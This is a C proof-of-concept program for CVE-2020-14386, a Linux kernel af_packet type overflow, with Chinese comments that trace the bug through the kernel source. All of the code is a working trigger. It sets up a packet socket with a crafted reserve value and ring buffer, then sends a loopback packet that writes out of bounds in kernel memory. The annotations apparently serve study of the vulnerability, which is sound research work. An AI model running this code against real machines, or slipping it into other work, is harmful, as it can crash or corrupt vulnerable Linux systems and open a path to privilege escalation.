// 程式來源: https://www.cnblogs.com/yisumi/p/14366168.html # POC
// 說明: https://paper.seebug.org/1348/

// CVE-2020-14386
// 測試版本: 4.6.0
// 漏洞: Type overflow
// 觸發點:
// https://elixir.bootlin.com/linux/v4.6/source/net/packet/af_packet.c#L2271
//
// 重要位置:
// https://elixir.bootlin.com/linux/v4.6/source/net/packet/af_packet.c#L2210  #(計算 netoff 和 macoff)
//
// 註:
// "說明" 的觸發點是 virtio_net_hdr_from_skb, 然而 kernel 是 __packet_rcv_vnet, 但這並不影響結果, 重點是第二個參數因為 macoff == 0 所以可以往前寫  sizeof(struct virtio_net_hdr) 個 bytes

#define _GNU_SOURCE

#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdbool.h>
#include <stdarg.h>
#include <net/if.h>
#include <stdint.h>


void packet_socket_send(int s, char *buffer, int size) {
        // 發包基本動作
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_halen = ETH_ALEN;

	if (sendto(s, buffer, size, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("[-] sendto(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
}

void loopback_send(char *buffer, int size) {
        // main 使用 SOCK_RAW 接收, 所以這裡也要用 SOCK_RAW 發包
	int s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (s == -1) {
		perror("[-] socket(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}

	packet_socket_send(s, buffer, size);
}

int main()
{
        // ifconfig lo up
	if (system("/sbin/ifconfig lo up") != 0) {
		perror("[-] system(/sbin/ifconfig lo up)");
		exit(EXIT_FAILURE);
	}


	int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL) );
	if (s < 0) {
		perror("socket\n");
		return 1;
	}

        // V1 和 V2 都可, 參見 https://elixir.bootlin.com/linux/v4.6/source/net/packet/af_packet.c#L2217 
	int v = TPACKET_V2;
	int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
	if (rv < 0) {
		perror("setsockopt(PACKET_VERSION)\n");
		return 1;
	}

        // 設定 PACKET_VNET_HDR 會使得 has_vnet_hdr = 1, 參見 https://elixir.bootlin.com/linux/v4.6/source/net/packet/af_packet.c#L3736
        // 要觸發漏洞必須要讓 has_vnet_hdr = 1, 參見 https://elixir.bootlin.com/linux/v4.6/source/net/packet/af_packet.c#L2270
	v = 1;
	rv = setsockopt(s, SOL_PACKET, PACKET_VNET_HDR, &v, sizeof(v));
	if (rv < 0) {
		perror("setsockopt(PACKET_VNET_HDR)\n");
		return 1;
	}

        // PACKET_RESERVE 用來控制 po->tp_reserve, 參見: https://elixir.bootlin.com/linux/v4.6/source/net/packet/af_packet.c#L3683
        // po->tp_reserve 會影響 netoff 的值, 參見 https://elixir.bootlin.com/linux/v4.6/source/net/packet/af_packet.c#L2210
	v = 0xffff - 20 - 0x30 -7;
	rv = setsockopt(s, SOL_PACKET, PACKET_RESERVE, &v, sizeof(v));
	if (rv < 0) {
		perror("setsockopt(PACKET_RESERVE)\n");
		return 1;
	}

        // 數字不知道怎麼來的, 我有試過將 tp_block_size 改成 0x88000 同樣會觸發漏洞, 但不會壞掉, 下面參數應該是有特別計算過, 導致往前寫會觸發 page fault !?
	struct tpacket_req req;
	memset(&req, 0, sizeof(req));
	req.tp_block_size = 0x800000;
	req.tp_frame_size = 0x11000;
	req.tp_block_nr = 1;	
	req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_RX_RING)");
		exit(EXIT_FAILURE);
	}

        // 發封包基本動作
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ALL);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;

	rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
	if (rv < 0) {
		perror("[-] bind(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	uint32_t size = 0x80000/8;
	char* buf = malloc(size);
	if(!buf) {
		perror("malloc\n");
		exit(EXIT_FAILURE);
	}

	memset(buf,0xce,size);
	loopback_send(buf,size);

	return 0;
}


